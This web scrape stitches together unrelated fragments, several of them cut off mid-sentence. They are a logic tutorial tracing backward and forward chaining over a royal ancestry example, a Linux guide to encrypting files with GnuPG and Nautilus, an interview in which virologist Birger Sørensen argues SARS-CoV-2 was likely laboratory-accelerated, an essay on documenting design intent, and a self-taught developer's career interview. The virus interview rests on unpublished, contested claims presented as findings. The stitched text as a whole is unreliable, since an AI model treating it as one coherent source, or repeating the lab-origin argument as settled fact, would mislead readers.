<li>Let’s backtrack to 5 when we were trying to prove “Prince Charles is an ancestor of Prince Andrew”. Rule 4 didn’t pan out, but maybe it can be proven another way.</li>
<li>Notice that it matches the consequent of rule 5, “X is an ancestor of Z”, with X = Prince Charles and Z = Prince Andrew.</li>
<li>Substitute into the antecedent of rule 5: “Prince Charles is an ancestor of Y and Y is an ancestor of Prince Andrew”</li>
<li>Try Y = Prince Andrew. Now we are considering "Prince Charles is an ancestor of Prince Andrew, and Prince Andrew is an ancestor of Prince Andrew.</li>
<li>Break up the conjunction. See if we can satisfy “Prince Charles is an ancestor of Prince Andrew”.</li>
<li>Wait, we were already trying to prove this in #5. Therefore, this proof would be circular, and we must backtrack. Let’s backtrack to #11, when we are trying to prove “Prince Charles is an ancestor of Y and Y is an ancestor of Prince Andrew”.</li>
<li>Try Y = Queen Elizabeth. Now we need to prove “Prince Charles is an ancestor of Queen Elizabeth and Queen Elizabeth is an ancestor of Prince Andrew”</li>
<li>This will fail – I’ll omit the details (Prince Charles is not, in fact, an ancestor of Queen Elizabeth.) In fact, there is no Y such that “Prince Charles is an ancestor of Y and Y is an ancestor of Prince Andrew”. We could backtrack all the way to #6, when we were trying to prove “Prince Charles is an ancestor of Prince Andrew”, but applying rule 4 failed, and so did applying rule 5. There are no more rules to apply.</li>
<li>Therefore we should backtrack further to #4, when we were trying to prove “X is an ancestor of Prince Andrew and X is an ancestor of Prince William”. This time, let’s try a different X, X = Queen Elizabeth. So our goal is “Queen Elizabeth is an ancestor of Prince Andrew, and Queen Elizabeth is an ancestor of Prince William”.</li>
<li>Break up the conjuction, first let’s prove “Queen Elizabeth is an ancestor of Prince Andrew.”</li>
<li>By rule 4, we need only to prove "Queen Elizabeth is a parent of Prince Andrew.</li>
<li>That is satisfied directly in fact #1!</li>
<li>Let’s try the other half of the conjunction from #17: “Queen Elizabeth is an ancestor of Prince William.”</li>
<li>By rule 4, we can pick a subgoal “Queen Elizabeth is a parent of Prince William.”</li>
<li>But this is a dead end and matches no rules. Let’s backtrack to 20, where we were trying to prove “Queen Elizabeth is an ancestor of Prince William” but try a rule other than than rule 4.</li>
<li>Notice this matches the consequent of rule 5 - “X is an ancestor of Z” with X = Queen Elizabeth, Z = Prince William.</li>
<li>Substitute into the antecedent of rule 5 for “Queen Elizabeth is an ancestor of Y, and Y is an ancestor of Prince William”</li>
<li>Let’s try Y = Prince Andrew. Then we must prove “Queen Elizabeth is an ancestor of Prince Andrew, and Prince Andrew is an ancestor of Prince William”.</li>
<li>Break up the conjuction. First let’s prove “Queen Elizabeth is an ancestor of Prince Andrew.”</li>
<li>By rule 4, we need only prove that "Queen Elizabeth is a parent of Prince Andrew.</li>
<li>This is satisfied by fact #1.</li>
<li>Now let’s try the other half of the conjunction in #25. “Prince Andrew is an ancestor of Prince William”</li>
<li>By rule 4, we need only prove that “Prince Andrew is a parent of Prince William”.</li>
<li>But this is a dead end. Let’s backtrack to #29 and try and prove “Prince Andrew is an ancestor of Prince William” by means other than rule 4.</li>
<li>How about rule 5, for “Prince Andrew is an ancestor of Y, and Y is an ancestor of Prince William”</li>
<li>This will fail… I’ll omit the details. We need to backtrack further to 24, when we were trying to prove “Queen Elizabeth is an ancestor of Y, and Y is an ancestor of Prince William”.</li>
<li>Before we tried Y = “Prince Andrew” and that failed. This time lets try Y = Prince Charles, so “Queen Elizabeth is an ancestor of Prince Charles, and Prince Charles is an ancestor of Prince William”.</li>
<li>Break up the conjunction and aim for the first half: “Queen Elizabeth is an ancestor of Prince Charles”</li>
<li>By rule 4, aim for “Queen Elizabeth is a parent of Prince Charles”</li>
<li>This is satisfied by fact #2.</li>
<li>Now aim for the second half of the conjunction in 34, “Prince Charles is an ancestor of Prince William”.</li>
<li>By rule 4, aim for “Prince Charles is a parent of Prince William”</li>
<li>This is satisfied by fact #3.</li>
<li>We’re done! We’ve found a proof.</li>
</ol>
<p>So the characteristic of “backward chaining” is that with this approach you explore a lot of subgoals that would be useful if you could prove them, but that may turn out to be impossible to prove.</p>
<p>So what is forward chaining? Unlike backward chaining, with forward chaining you don’t start with a goal. You start with what you know. And then you use what you know to deduce new knowledge. And you use that new knowledge to deduce more new knowledge – until hopefully one of the things you deduce is the goal.</p>
<p>So, given the same example.</p>
<ol type="1">
<li>Pick a rule at random. Let’s say rule 6.</li>
<li>Take the antecedent of the rule “if X is an ancestor of Y, and X is an ancestor of Z,” and try to apply it to a fact.</li>
<li>Hmm, nope. We actually haven’t deduced that anybody is the ancestor of anybody else yet, so we struck out with rule 6. Let’s try a different one.</li>
<li>What about the antecedent of rule 4? “If X is a parent of Y, then X is an ancestor of Y”.</li>
<li>Well we know from fact #1 that Queen Elizabeth is a parent of Prince Andrew. Therefore we can deduce by rule 4 that Queen Elizabeth is an ancestor of Prince Andrew.</li>
<li>Furthermore, we know from fact #2 that Queen Elizabeth is a parent of Prince Charles. Therefore we can deduce by rule 4 that Queen Elizabeth is an ancestor of Prince Charles.</li>
<li>Furthermore, we know from fact #3 that Prince Charles is a parent of Prince William. Therefore we can deduce by rule 4 that Prince Charles is an ancestor of Prince William.</li>
<li>That’s it for rule 4. Now let’s try applying rule 6, the antecedent of which is “If X is an ancestor of Y, and X is an ancestor of Z”.</li>
<li>What if we let X = Queen Elizabeth, Y = Prince Andrew, and Z = Prince William? We deduced in #5 than Queen Elizabeth is an ancestor of Prince Andrew. But we’ve never deduced that Queen Elizabeth is an ancestor of Prince William, so this is a no go.</li>
<li>What if we let X = Queen Elizabeth, Y = Prince Andrew, and Z = Prince Charles? We deduced in #6 than Queen Elizabeth is an ancestor of Prince Charles, and we deduced in #5 than Queen Elizabeth is an ancestor of Prince Andrew. Both conditions are satisfied. Therefore we can deduce by rule 6 that “Prince Andrew and Prince Charles are related.” Unfortunately, that’s not our goal.</li>
<li>What about rule 5 now, with the antecedent “if X is an ancestor of Y, and Y is an ancestor of Z.”</li>
<li>Let’s take X = Queen Elizabeth, Y = Prince Charles, and Z = Prince William. We deduced in #6 that Queen Elizabeth was ancestor to Charles, and in #7 that Charles was ancestor to William. Therefore by rule 5 we can deduce that Queen Elizabeth is ancestor to Prince William.</li>
<li>Now let’s do …</li></ol></section></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Linux is great for creating the most secure system you will work on. there are quite a few tools meant to protect your data. </p>
<p>Some tools are built into the operating system, while others must be installed. </p>
<p>Thus, lets see up next how to encrypt and decrypt files with a password in Linux.</p>
<h2 id="Encrypt-files-with-a-GUI"><a href="#Encrypt-files-with-a-GUI" title="Encrypt files with a GUI"></a>Encrypt files with a GUI</h2><p>Another useful tip on how to encrypt files with a password in Linux is to use a graphical tool that features a Nautilus file manager. </p>
<p>You can encrypt/decrypt files with a right-click on the target file.<br>Type the command  <code>sudo apt-get install seahorse-nautilus -y</code>, and after the installation process is done, restart Nautilus with the command nautilus -q. </p>
<p>From this point on, all you have to do is right click on the file you want encrypted and click the encrypt function.</p>
<p><img src="https://bsdnerds.org/images/nautilus-encrypt-gui.png" alt="encrypt files with gui using nautilus on linux"></p><h2 id="Encrypt-files-with-gnupg"><a href="#Encrypt-files-with-gnupg" title="Encrypt files with gnupg"></a>Encrypt files with gnupg</h2><p>GnuPG represents a tool useful for securing both communication and data storage. It is great for encrypting files/folders and for designing digital signatures. This tool comes with a professional key management option.</p>
<h3 id="Install-gnupg"><a href="#Install-gnupg" title="Install gnupg"></a>Install gnupg</h3><p>GnuPG can be installed in <strong>Debian, Ubuntu or Mint Linux</strong> with the following command: </p>
<pre><code>$ sudo apt-get install gnupg</code></pre><p>For <strong>Red hat</strong> or <strong>CentOS Linux</strong> you will have to use the command - </p>
<pre><code>$ sudo yum install gnupg</code></pre><p>For <strong>Fedora Linux</strong> you will have to use the command -<br>    $ sudo dnf install gnupg</p>
<p>For <strong>Arch Linux</strong> you will have to use the command - </p>
<pre><code>$ sudo pacman -S gnupg</code></pre><p>For <strong>OpenSUSE Linux</strong> you will have to use the command - </p>
<pre><code>$ sudo zypper install gpg2</code></pre><p>For <strong>FreeBSD unix</strong> you will have to use the command for the port -</p>
<pre><code># cd /usr/ports/security/gnupg/ &amp;&amp; make install clean</code></pre><p>and add the package via </p>
<pre><code># pkg install gnupg.</code></pre><p>For <strong>OpenBSD unix</strong> you will have to use the command -</p>
<pre><code>$ doas pkg_add gnupg</code></pre><h3 id="How-to-use-GPG"><a href="#How-to-use-GPG" title="How to use GPG"></a>How to use GPG</h3><p>After this, you can start encrypting your data in either Linux or Unix, with the aid of the following commands:<br>    A single file requires the command -</p>
<pre><code>$ gpg -c filename</code></pre><p>    A myfinancial.info.txt file requires the command -</p>
<pre><code>$ gpg -c myfinancial.info.txt</code></pre><p>On the other hand, to decrypt data in Linux or Unix systems, you can use one of the following commands:</p>
<pre><code>$ gpg myfinancial.info.txt.gpg
$ gpg -d myfinancial.info.txt.gpg
$ gpg --decrypt myfinancial.info.txt.gpg</code></pre><h2 id="Hide-files-with-File-Manager"><a href="#Hide-files-with-File-Manager" title="Hide files with File Manager"></a>Hide files with File Manager</h2><p>Even though this is not actually an encryption process, it is quite helpful for hiding important data in plain sight. </p>
<p>Thus, you can open your distributions default file manager in the location you are planning to hide a file. Right-click an empty spot and select New Folder. Name the folder starting with a period (i.e if you plan to name it <code>data</code>, you should type <code>.data</code>). </p>

            The well-known Norwegian virologist Birger Sørensen and his colleagues have examined the corona virus. They believe it has certain properties which would not evolve naturally. These conclusions are politically controversial, but in this interview he shares the findings behind the headlines.
            </h3>

    

</div>


                <div><p>“I understand that this is controversial, but the public has a legitimate need to know, and it is important that it is possible to freely discuss alternate hypotheses on how the virus originated” Birger Sørensen starts to explain when Minerva visits him in his office one morning in Oslo.</p><p>Despite the explosiveness of his statements and research, Sørensen remains calm and collected.</p><p>Sørensen has been a point of controversy ever since former MI6 director Richard Dearlove cited a yet to be published article by Sørensen and his colleagues in an interview with The Daily Telegraph. The article claims that the virus that causes Covid-19 most likely has not emerged naturally.</p><p>“It’s a shame that there has already been so much talk about this, because I have yet to publish the article where I put forward my analysis”, Sørensen says in the form of an exasperated sigh.</p><p>Together with his colleagues, Angus Dalgleish and Andres Susrud have authored an article that looks into the most plausible explanations regarding the origins of the novel coronavirus. The article builds upon an already published article in the Quarterly Review of Biophysics that describes newly discovered properties in the virus spike protein. The authors are still in dialogue with scientific journals regarding an upcoming publication of the article.</p><p>News outlets are thus confronted with a difficult question: Are the findings and arguments Sørensen and his colleagues put forward of a sufficiently high quality to be presented and discussed in the public sphere? Sørensen explains that they in their dialogue with scientific journals are encountering a certain reluctance to publishing the article – without, however, proper scientific objections. Minerva has read a draft of the article, and has after an overall assessment decided that the findings and arguments do deserve public debate, and that this discussion cannot depend entirely on the publication process of scientific journals.</p><p>In this interview with Minerva, Sørensen therefore puts forward his hypothesis on why it is highly unlikely that the coronavirus emerged naturally.</p><p>On May 18th, WHO decided to conduct an inquiry into the coronavirus epidemic in China. Sørensen believes that it is important that this inquiry looks into new and alternate explanations for how the virus originated, beyond the already well-known suggestion that the virus originated in the Wuhan Seafood Market.</p><p>“There are very few who still believe that the epidemic started there, so as of today we have no good answers on how the epidemic started. Then we must also dare to look at more controversial, alternative explanations for the origin,” Sørensen says.</p><p>Birger Sørensen and one of his co-authors, Angus Dalgleish, are already known as HIV researchers par excellence.</p><p>In 2008, Sørensen’s work came to international <a href="https://www.dagensperspektiv.no/2008/norsk-firma-med-hiv-gjennombrudd">attention</a> when he launched a new immunotherapy for HIV. <a href="https://www.nature.com/search?author=%22Angus%20G.+Dalgleish%22">Angus Dalgleish</a> is the professor at St. George’s Medical School in London who became world famous in 1984 after having <a href="https://www.nature.com/articles/312763a0">discovered</a> a novel receptor that the HIV virus uses to enter human cells.</p><p>The purpose of the work Sørensen and his colleagues have done on the novel coronavirus, has been to produce a vaccine. And they have taken their experience in trialling HIV vaccines with them to analyse the coronavirus more thoroughly, in order to make a vaccine that can protect against Covid-19 without major side effects.</p><h2>Exceptionally well adjusted</h2><p>“The difference between our approach and other vaccine manufacturers is that we have a chemistry background, and we analyse the virus in detail as if we were making a drug,” Sørensen starts to explain.</p><p>“Biology is also chemistry, so by considering the virus from a chemistry perspective, we carry out more detailed analysis, zooming in on certain components.”</p><p>Sørensen takes us through the basic elements of their approach:</p><p>“The first thing you need to establish is which parts of the virus are changing, and which parts are stable. If you want to make a vaccine that lasts, you must stimulate the immune system to react against those parts of the virus that are constant, otherwise the effect will disappear and, in the worst-case scenario, lead to increased illness.</p><p>“Once we know this, we can try to make a vaccine. Where we differ is that we are trying to make a vaccine that uses elements that have as little in common with the body’s natural components as possible, so that the immune system is taught to recognise exactly what the vaccine should protect against”, Sørensen elaborates.</p><p>Sørensen believes this is an important insight which will prevent the immune system from being falsely stimulated in a way that could lead the vaccine to create too many dangerous side effects in the vaccinated person.</p><p>“When we have not succeeded in creating an HIV vaccine, despite the enormous efforts put into that endeavour for the past 30 years, it is because we haven’t understood this,” Sørensen continues.</p><p>He believes that there has not been enough interaction between the part of the pharmaceutical industry that makes HIV medicines and the part that runs the vaccine research. As a consequence, the knowledge you need to make a successful vaccine against HIV in the big pharmaceutical companies has not been adequately exploited by the big, international HIV preventing vaccine studies that have been carried out.”</p><p>Asked about what significance his approached has had when he has analyzed the coronavirus, Sørensen explains:</p><p>“We have examined which components of the virus are especially well suited to attach themselves to cells in humans. And we have done this by comparing the properties of the virus with human genetics. What we found was that this virus was exceptionally well adjusted to infect humans.”</p><p>He pauses for a second.</p><p>“So well that it was suspicious,” he adds.</p><h2>Perfected to infect humans</h2><p>It is already known that the novel coronavirus, like the virus that caused the SARS epidemic in Southeast Asia in 2002-2003, could attach itself to the ACE-2 receptors in the lower respiratory tract.</p><p>“But what we have discovered is that there are properties in this new virus which enables it to use an additional receptor, and create a binding to human cells in the upper respiratory tract and the intestines which is strong enough to produce an infection,” Sørensen elaborates.</p><p>Sørensen says that it is the use of this additional receptor that most likely results in a different illness in Covid-19 patients than the one resulting from SARS.</p><p>“This is what enables the virus to transmit to a greater degree between humans, without the virus having attached itself to the ACE-2 receptors in the lower respiratory tract, where it causes deep pneumonia.</p><p>“That is also why so many of the Covid-19 patients have mild symptoms at the start of the illness, and are contagious before they develop severe symptoms,” he adds.</p><p>It might also explain why some people are ‘super spreaders’ without being ill themselves, Sørensen says.</p><p>In the already published article Sørensen and his colleagues Angus Dalgleish and Andres Susrud describe what they claim is curious about the spike protein of the coronavirus, which makes it especially well suited to infect humans. These findings are the foundation for the hypothesis Sørensen and his colleagues develop in the new article, where they claim that the virus is not natural in origin.</p><div id="factbox-361864">
    <div>
        
        <h2>FACT BOX – Spike Protein</h2>
        <p>A spike protein is a part of the virus attached to the surface of the virus. The spike protein is used by the virus when it enters cells, enabling it to stick in humans. The properties of the spike determines which receptors a virus can utilise and thus which cells the virus can enter to create illness.</p>
        
    </div>
    
</div><p>“There are several factors that point towards this,” says Sørensen. “Firstly, this part of the virus is very stable; it mutates very little. That points to this virus as a fully developed, almost perfected virus for infecting humans.</p><p>“Secondly, this indicates that the structure of the virus cannot have evolved naturally. When we compare the novel coronavirus with the one that caused SARS, we see that there are altogether six inserts in this virus that stand out compared to other known SARS viruses,” he goes on explaining.</p><p>Sørensen says that several of these changes in the virus are unique, and that they do not exist in other known SARS coronaviruses.</p><p>“Four of these six changes have the property that they are suited to infect humans. This kind of aggregation of a type of property can be done simply in a laboratory, and helps to substantiate such an origin,” Sørensen points out.</p><h2>An artificially created virus</h2><p>Asked about whether this implies that the virus is not natural, Sørensen goes on to explain the laboratory process that leads to the creation of new viruses.</p><p>“In a sense it is natural. But the natural processes have most likely been accelerated in a laboratory,” he explains. “It’s also possible for a virus to attain these properties in nature, but it’s not likely. If the mutations had happened in nature, we would have most likely seen that the virus had attracted other properties through mutations, not just properties that help the virus to attach itself to human cells.”</p><p>Sørensen vividly explains this argument:</p><p>“Imagine that you have cultivated a billion coronaviruses you have gathered from nature, then you take this mass of viruses and inject them into a human cell culture from for example the upper respiratory tract. As a result, a few of these viruses will change in order to better attach themselves to …</p></div></section></article></div>

<p>Only loosely related to what it should do.</p>


<p>Code says what it does. That's important for the computer, because code is the way that we ask the computer to do something. It's OK for humans, as long as we never have to modify or debug the code. As soon as we do, we have a problem. Fundamentally, debugging is an exercise in changing what a program does to match what it should do. It requires us to know what a program should do, which isn't captured in the code. Sometimes that's easy: What it does is crash, what it should do is <em>not crash</em>. Outside those trivial cases, discovering intent is harder.</p>

<p>Debugging when <em>should do</em> is subtle, such as when building distributed systems protocols, is especially difficult. In our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper, we say:</p>

<blockquote><p>Our code reviews, simworld tests, and design meetings frequently referred back to the TLA+ models of our protocols to resolve ambiguities in Java code or written communication.</p></blockquote>

<p>The problem is that the implementation (in Physalia's case the Java code) is both an imperfect implementation of the protocol, and an overly-specific implementation of the protocol. It's overly-specific because it needs to be fully specified. Computers demand that, and no less, while the protocol itself has some leeway and wiggle room. It's also overly-specific because it has to address things like low-level performance concerns that the specification can't be bothered with.</p>

<p><em>Are those values in an ArrayList because order is actually important, or because O(1) random seeks are important, or some other reason? Was it just the easiest thing to write? What happens when I change it?</em></p>

<p>Business logic code, while lacking the cachet of distributed protocols, have even more of these kinds of problems. Code both over-specifies the business logic, and specifies it inaccurately. I was prompted to write this by a tweet from @mcclure111 where she hits the nail on the head:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">Since most software doesn't have a formal spec, most software "is what it does", there's an incredible pressure to respect authorial intent when editing someone else's code. You don't know which quirks are load-bearing.</p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422600236765186?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>This is a major problem with code: <em>You don't know which quirks are load-bearing.</em> You may remember, or be able to guess, or be able to puzzle it out from first principles, or not care, but all of those things are slow and error-prone. What can we do about it?</p>

<p><strong>Design Documentation</strong></p>

<p>Documentation is uncool. Most software engineers seem to come out of school thinking that documentation is below them (<em>tech writer work</em>), or some weird thing their SE professor talked about that is as archaic as Fortran. Part of this is understandable. My own software engineering courses emphasized painstakingly documenting the implementation in UML. No other mention of documentation was made. Re-writing software in UML helps basically nobody. I finished my degree thinking that documentation was unnecessary busywork. Even the <a href="https://agilemanifesto.org/">Agile Manifesto</a> agreed with me<sup><a href="#foot1">1</a></sup>:</p>

<blockquote><p>Working software over comprehensive documentation</p></blockquote>

<p>What I discovered later was that design documentation, encoding the intent and decisions made during developing a system, helps teams be successful in the short term, and people be successful in the long term. Freed from fitting everything in my head, emboldened by the confidence that I could rediscover forgotten facts later, I could move faster. The same applies to teams.</p>

<p>One thing I see successful teams doing is documenting not only the <em>what</em> and <em>why</em> behind their designs, but the <em>how they decided</em>. When it comes time to make changes to the system—either for debugging or in response to changing requirements—these documents are invaluable. It's hard to decide whether its safe to change something, when you don't know why it's like that in the first place. The record of how you decided is important because you are a flawed human, and understanding how you came to a decision is useful to know when that decisions seems strange, or surprising.</p>

<p>This documentation process doesn't have to be heavyweight. You don't have to draw painstaking <a href="https://en.wikipedia.org/wiki/Entity%E2%80%93relationship_model">ER diagrams</a> unless you thing they are helpful. You should probably ignore UML entirely. Instead, describe the system in prose as clearly as succinctly as you can. One place to start is by building an RFC template for your team, potentially inspired by one that you find on the web. <a href="https://static1.squarespace.com/static/56ab961ecbced617ccd2461e/t/5d792e5a4dac4074658ce64b/1568222810968/Squarespace+RFC+Template.pdf">SquareSpace</a>'s template seems reasonable. Some designs will fit well into that RFC format, other's won't. Prefer narrative writing where you can.</p>

<p>Then, keep the documents. Store them somewhere safe. Soak them in vinegar <a href="https://www.almanac.com/content/home-remedies-cough-relief">and tie them around your chest</a>. You're going to want to make sure that the people who need to maintain the system can find them. As they are spelunking through history, help them feel more like a library visitor and less like Lara Croft.</p>

<p>I'm not advocating for Big Design Up Front. Many of the most important things we learn about a project we learn during the implementation. Some of the most important things we learn years after the implementation is complete. Design documentation isn't a static one-time ahead-of-time deliverable, but an ongoing process. Most importantly, design documentation is not a commitment to bad ideas. If it's wrong, fix it and move forward. Documentation is not a deal with the devil.</p>

<p><strong>Comments</strong></p>

<p>Few topics invite a programmer flame war like comments. We're told that comments are silly, or childish, or make it hard to show how manly you are in writing that convoluted mess of code. If it was hard to write, it should be hard to read. After all, you're the James Joyce of code.</p>

<p>That silliness aside, back to @mcclure111's thread:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">This means comments that *reveal* authorial intent are valuable, and comments that reveal *there was no authorial intent* are even more valuable. Without those hints, you're left editing superstitiously, preserving quirks even when you don't know why. <a href="https://t.co/YhvWnXjp9i">https://t.co/YhvWnXjp9i</a></p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422825831596039?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>Comments allow us to encode <em>authorial intent</em> into our code in a way that programming languages don't always. Types, traits, interfaces, and variable names do put intent into code, but not completely (I see you, type system maximalists). These same things allow us to communicate a lack of intent—consider <a href="https://docs.oracle.com/javase/8/docs/api/java/util/RandomAccess.html">RandomAccess</a> vs <a href="https://docs.oracle.com/javase/8/docs/api/java/util/ArrayList.html">ArrayList</a>—but are also incomplete. Well-commented code should make the intent of the author clear, especially in cases where that intent is either lost in the translation to code, or where implementation constraints hide the intent of the design. Code comments that link back to design documents are especially useful.</p>

<p>Some languages need comments more than others. Some, like SQL, I find to nearly always obscure the intent of the design behind implementation details.</p>

<p><strong>Formal Specification</strong></p>

<p>In <a href="https://cacm.acm.org/magazines/2015/4/184705-who-builds-a-house-without-drawing-blueprints/fulltext">Who Builds a House Without Drawing Blueprints?</a> Leslie Lamport writes:</p>

<blockquote><p>The need for specifications follows from two observations. The first is that it is a good idea to think about what we are going to do before doing it, and as the cartoonist Guindon wrote: "Writing is nature's way of letting you know how sloppy your thinking is."</p>

<p>The second observation is that to write a good program, we need to think above the code level.</p></blockquote>

<p>I've found that specification, from informal specification with narrative writing to formal specification with TLA+, makes writing programs faster and helps reduce mistakes. As much as I like that article, I think Lamport misses a key part of the value of formal specification: it's a great communication tool. In developing some of the trickiest systems I've built, I've found that heavily-commented formal specifications are fantastically useful documentation. Specification languages are all about <em>intent</em>, and some make it easy to clearly separate intent from implementation.</p>

<p>Again, from our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper:</p>

<blockquote><p>We use TLA+ extensively at Amazon, and it proved exceptionally useful in the development of Physalia.  Our team used TLA+ in three ways: writing specifications of our protocols to check that we understand them deeply, model checking specifications against correctness and liveness properties using the TLC model checker, and writing extensively commented TLA+ code to serve as the documentation of our distributed protocols. While all three of these uses added value, TLA+’s role as a sort of automatically tested (via TLC),and extremely precise, format for protocol documentation was perhaps the most useful.</p></blockquote>

<p>Formal specifications make excellent documentation. Like design docs, they aren't immutable artifacts, but a reflection of what we have learned about the problem.</p>

<p><strong> Conclusion </strong></p>

<p>Building long-lasting, maintainable, systems requires not only communicating with computers, but also communicating in space with other people, and in time with our future selves. Communicating, recording, and indexing the intent behind our designs is an important part of that picture. Make time for it, or regret it later.</p>

                        <p>Mariano used to make $2,500 a year in Argentina 10 years ago. He now makes $210,000 as a self-taught developer working remotely. That's 84 * $2,500.</p><p>Mariano shares his story of learning to code for free, working his way out of poverty and getting lucrative remote jobs from Argentina. I've not been this excited about an article for a long time. Enjoy!</p><h2 id="hey-can-you-introduce-yourself">Hey, can you introduce yourself? </h2><p>Sure! My name is <a href="https://twitter.com/geekmz">Mariano Zorrilla</a>, I’m 31 years old and a Tech Lead at Venmo/PayPal. Before that I was a Head of Mobile at HighSide (a startup). I was raised in a small city called Rio Ceballos in Cordoba province in Argentina. The population is around 20,000 people. There are only medium to low income families. Every single store is locally owned (no retail stores, no big names, no chains, no fast food companies). </p><p>When I was a kid we had an income of around $400 dollars a month for the entire family (6 in total) and lots of debt. I went to a local elementary school and high school. Due to our family income, I couldn’t go to college. Even though it's free in my country I was living 30 miles (50km) away from any college. I couldn't afford paying the bus ticket every day.</p><h2 id="how-much-do-you-earn-roughly-as-a-software-engineer">How much do you earn roughly as a software engineer? </h2><p>Right now I make $210,000 a year. I always look into ways to increase and diversifying my income. Because I live in Argentina, I can have a good life spending around $2k dollars a month. Then I put all my money into savings accounts for future big investments.</p><h2 id="can-you-tell-us-about-the-economic-situation-in-argentina">Can you tell us about the economic situation in Argentina?</h2><p>In Argentina, the poverty rate was around 35% when I started coding and now sits at around 50% of the population. Only 40% of the active population is currently working. Apart from the private sector, the rest work for the public sector or don’t work at all. They have a small monthly income of $150 dollars a month from government benefits.</p><h2 id="why-did-you-learn-to-code">Why did you learn to code? </h2><p>All those things made me keep looking forward to becoming a mobile developer. I was lucky enough to have friend next door who was the only hardware engineer in the entire city. He at least had an idea of what “coding” was about. I chatted with him to start the process (and now I bring him to work with me at Venmo/PayPal).</p><p>I started working at the age of 14 helping my mom. My first bucks came when I was 17 years old responding to phone calls on a local FM Radio and TV Station 1 hour a day. After 3 months I got something like $45.</p><p>Getting better jobs was hard because the “best” ones were in the city close by. Paying for the bus was already taking a big part of my salary. So I managed to get work at a call center (Customer Phone Care). I earned around $200 to $250 a month so enough for me to travel, pay for food and that’s it. &nbsp;I stayed that way until I turned 20 years old and I was really depressed with no future ahead of me. </p><p>Every day I had 3 hours in total going to and back from work on a bus to “think” about things I could do to have a better income. By then, the iPhone was a thing and I had an old 2004 smartphone (Nokia). By then it was 2009 &nbsp;but I could run apps and I found that amazing! It was a pocket PC for me.</p><p>In one of those trips I read an article about Google doing a phone. People will be able to do apps! So, I got this crazy idea of doing apps. I didn’t even have a PC at home, but at least I got my first goal. &nbsp;Due to my low income, I couldn’t have a credit card, so I decided to buy a cheap netbook (those 7” to 10” &nbsp;laptops). </p><p>I split the laptop cost into six small payments as the whole cost was much as my whole month's salary. &nbsp;That small machine allowed me to download Eclipse and Photoshop. So I could start learning every time I had free time out of work. The journey to learn how to code started there aged 21. Again, I was saving to get my first Android device (the Motorola Milestone/Droid).</p><!--kg-card-begin: markdown--><p><a href="https://gum.co/XUBNd"><img src="https://www.nocsdegree.com/content/images/2020/06/imposter-syndrome-with-image-collage-2--1-.jpg" alt="imposter-syndrome-with-image-collage-2--1-"></a></p>
<!--kg-card-end: markdown--><h2 id="how-did-you-learn-to-code-without-a-cs-degree">How did you learn to code without a CS degree? </h2><p>I got a JAVA SE 6 book (2.300 pages) which I didn’t understand even a bit of the first time… and the same for my second time. I tried to follow a course about Android for 3 months that I also didn’t understand much. But I kept in contact with the teacher to “code professionally”. I tried to work with him for a few months but I couldn’t pay for my bus ticket and stopped doing it. </p><p>I spent almost a year unemployed doing some coding at home. I was testing what I was doing wrong but I get so frustrated and sometimes depressed. I managed to make a small FM Radio app getting the URL of a local station from their website. The owners talked with me to make it “look good” and that allowed me to improve my code. </p><p>During all that time and year I tried to do job interviews. I got so many non stop “Nos” from everyone because I didn’t have a CS Degree and didn’t have any industry experience. I spent 3 months doing a super simple app with little functionality. But I learned all the process of posting the app over the Android Market (yep, the old name of the Play Store). I didn’t get any money from that, but I started getting my name around the city and ended up trying to get clients.</p><p>After a couple of months of unemployment I got back to a call center to get a bit of money to pay the bills. This time I spent all my free time coding anything I could think of. I was watching blog post tutorials and understanding MCV and MVP architecture. Plus, learning Java from top to bottom. </p><p>I quit after a year and managed to get a client who needed Android, iOS and a website. I knew nothing about iOS and websites, but I took the challenge. I asked him if he could lend me his Mac Mini to code in iOS as I needed Xcode to run that. &nbsp;I saved up to get a cheap iPod Touch to test the app.</p><p>I searched on every blog possible how to parse JSON, how to do API connections and play audio. I ended up with a basic app in 2 weeks. In that time I also re-did the first app that originally took me 3 months in 2 days. I used all the knowledge I got after 1 year &nbsp;of non-stop practicing and practicing. </p><p>For websites I learned PHP, MySQL, some DevOps skills and AWS. I got a WordPress website running with a basic endpoint to fetch news. I also did some freelance work to get a few extra dollars, but I mostly did UI/UX for mobile apps.</p><h2 id="moving-to-buenos-aires">Moving to Buenos Aires</h2><p>That client lasted for 8 months. When the money was running out, I saw an Android job opportunity on Twitter and decided to give it a try. It was 400 miles (650km) away from where I was; from a small city to the biggest in the entire country, Buenos Aires. It was a mobile game company. Because I love to do animations, I demonstrated this to them, got hired and moved to Buenos Aires. &nbsp;I made a $12k annual salary which sounded incredible for me at the time.</p><p>I learned a lot about how to use Git, different mobile architectures, working with a large team and making a large project with millions of users. Like before, I spent all my free time learning new coding skills but now with a much larger scope. (mostly from blogs, youtube videos and github open source projects.) Then, thanks to my English skills I managed to get jobs from the United States.</p><h3 id="prepare-for-technical-interviews-with-algo-expert-nocs-gets-you-15-off-">Prepare for technical interviews with <a href="https://www.algoexpert.io/nocs">Algo Expert</a>- "NOCS" gets you 15% off. </h3><h2 id="getting-remote-jobs-as-a-developer">Getting remote jobs as a developer</h2><p>I first landed at a young startup which was a terrible experience but I get to know San Francisco for a month. That was my dream since I started watching all the events and companies being over there). Then I moved to some remote software factories for a while making $24k a year. Then, I became a senior contractor developer for a huge mobile game company in San Francisco. This increased my income to $40k a year.</p><p>My last two &nbsp;jobs were also remote: I was Head of Mobile for a NYC Startup company where I fixed their native client apps. I managed to talk with the CEO and CTO to check technologies and use Flutter to have 1 code base. I was still in Argentina while making $60k a year in that position. I lasted 1 year there with so many challenges. I was learning complex algorithms and scaling a huge chat app. </p><p>Then I got a phone call from my previous contractor about a huge opportunity. It was at Venmo/PayPal making $160k a year as a Tech Lead. That was thanks to all the management level knowledge I got from previous jobs. I was not only involved with the code, but the product itself. Plus, I have extra consultant/freelance work for another $50k a year.</p><h2 